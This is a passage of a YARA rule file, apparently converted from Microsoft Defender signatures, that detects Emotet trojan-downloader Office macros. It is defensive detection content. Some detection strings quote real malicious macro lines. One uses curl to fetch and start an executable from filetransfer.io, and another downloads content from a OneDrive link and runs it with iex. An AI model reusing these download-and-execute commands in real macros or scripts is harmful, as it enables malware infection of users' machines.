        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "iUogfTL = CallByName(ZcJyjL, iHrzDGFw, Pm)" ascii //weight: 1
        $x_1_2 = "FlsrzZ = Mid(NHoaG, psbGnNO(dXEvNx), GnfXi)" ascii //weight: 1
        $x_1_3 = "For Each QOQWTNJ In TWLB.Items" ascii //weight: 1
        $x_1_4 = "ajm = CallByName(ActiveDocument, VAURfFek, DDc)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PSWA_2147898434_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PSWA!MTB"
        threat_id = "2147898434"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 45 54 55 [0-10] 28 29 [0-15] 52 4e [0-10] 65 [0-10] 22 2c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VRC_2147923970_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VRC!MTB"
        threat_id = "2147923970"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "AutoOpen Macro" ascii //weight: 1
        $x_1_2 = "Shell (\"cmd /c curl filetransfer.io/data-package/AuN8CiZP/download --output p.exe && start p.exe\")" ascii //weight: 1
        $x_1_3 = "Shell (A & O & B & \"'https://onedrive.live.com/download?resid=59261C7E41B6478A%21215&authkey=!AILxsvzlZboP3io' -UseBasicParsing).Content | iex \")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

